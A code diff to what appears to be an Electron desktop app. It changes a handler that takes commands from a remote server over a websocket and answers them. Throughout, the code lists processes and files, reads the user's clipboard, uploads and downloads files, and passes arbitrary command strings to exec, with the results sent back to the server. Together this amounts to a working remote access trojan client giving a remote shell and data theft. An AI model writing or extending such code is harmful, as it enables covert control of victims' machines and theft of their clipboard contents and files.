@@ -28,29 +28,31 @@ function createWindow() {
 
 function handleServerCommand(data) {
   console.log(data.command);
-  switch (data.command) {
-    case 'list_processes':
+  switch (true) {
+    case data.command == 'list_processes':
       exec('ps aux', (err, stdout) => {
         if (!err) sendResponse(stdout);
       });
       break;
-    case 'list_files':
+    case data.command == 'list_files':
       fs.readdir(process.cwd(), (err, files) => {
-        console.log(files);
-        if (!err) sendResponse(files);
+        const fileListAsString = files.join(', ');
+        console.log(fileListAsString);
+        if (!err) sendResponse(fileListAsString);
       });
       break;
-    case 'get_clipboard':
+    case data.command == 'get_clipboard':
       sendResponse(clipboard.readText());
       break;
-    case 'upload_file':
+    case data.command == 'upload_file':
       uploadFile(data.filePath);
       break;
-    case 'download_file':
+    case data.command == 'download_file':
       downloadFile(data.fileName);
       break;
-    case 'execute_command':
-      exec(data.commandString, (err, stdout) => {
+    case data.command && data.command.startsWith('execute_command'):
+      console.log(data.command.split(' ').slice(1).join(' '))
+      exec(data.command.split(' ').slice(1).join(' '), (err, stdout) => {
         if (!err) sendResponse(stdout);
       });
       break;
@@ -60,7 +62,8 @@ function handleServerCommand(data) {
 }
 
 function sendResponse(result) {
-  ws.send(JSON.stringify({ result }));
+  console.log(JSON.stringify({ action: "send_result",status:"success",result: result }))
+  ws.send(JSON.stringify({ action: "send_result",status:"success",result: result }));
 }
 
 function uploadFile(filePath) {
